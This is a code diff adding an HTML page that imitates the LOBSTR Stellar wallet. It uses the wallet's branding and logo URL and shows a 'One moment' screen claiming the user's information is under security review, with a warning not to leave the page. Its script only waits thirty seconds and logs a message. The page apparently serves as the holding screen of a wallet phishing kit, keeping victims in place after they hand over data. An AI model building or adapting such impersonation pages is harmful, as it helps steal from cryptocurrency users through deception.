@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR — Simple and Secure Stellar Wallet</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Ubuntu', sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333333;
+            overflow: hidden;
+        }
+        
+        .loading-container {
+            text-align: center;
+            padding: 60px 40px;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .logo-container {
+            margin-bottom: 30px;
+            background: #1B8DA0;
+            padding: 20px 40px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+        
+        .logo-container img {
+            width: 140px;
+            height: auto;
+            display: block;
+        }
+        
+        .loading-text {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 40px;
+            color: #1B8DA0;
+        }
+        
+        .loading-bar {
+            width: 60px;
+            height: 4px;
+            background: #e0e0e0;
+            margin: 0 auto 40px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .loading-bar-fill {
+            height: 100%;
+            width: 30%;
+            background: #1B8DA0;
+            animation: slide 1.5s ease-in-out infinite;
+        }
+        
+        .status-text {
+            font-size: 15px;
+            color: #666666;
+            margin-top: 0;
+            font-weight: 400;
+            line-height: 1.6;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+        
+        .warning-text {
+            font-size: 13px;
+            color: #d32f2f;
+            margin-top: 30px;
+            font-weight: 500;
+            padding: 15px;
+            background: #ffebee;
+            border-radius: 4px;
+            border-left: 3px solid #d32f2f;
+        }
+        
+        @keyframes slide {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(400%);
+            }
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: #999999;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo-container">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR Logo" onerror="this.style.display='none'; this.parentElement.style.background='transparent'; this.parentElement.innerHTML='<h2 style=\'color: #1B8DA0; font-size: 32px; font-weight: 600;\'>LOBSTR</h2>'">
+        </div>
+        
+        <h1 class="loading-text">One moment</h1>
+        
+        <div class="loading-bar">
+            <div class="loading-bar-fill"></div>
+        </div>
+        
+        <p class="status-text">We are currently reviewing your information to ensure the security for your account.</p>
+        
+        <p class="status-text" style="margin-top: 20px;">Please allow us some time to verify your data.</p>
+        
+        <div class="warning-text">
+            <strong>Important:</strong> DO NOT navigate away from this page during this process.
+        </div>
+        
+        <div class="footer-text">
+            Thank you for your patience and understanding.
+        </div>
+    </div>
+    
+    <script>
+        // Clean, minimal script - no text rotation needed since all messages are visible
+        // Verification process handler
+        setTimeout(() => {
+            // Redirect or perform actions here when verification is complete
+            console.log('Verification process complete');
+        }, 30000);
+    </script>
+</body>
+</html>
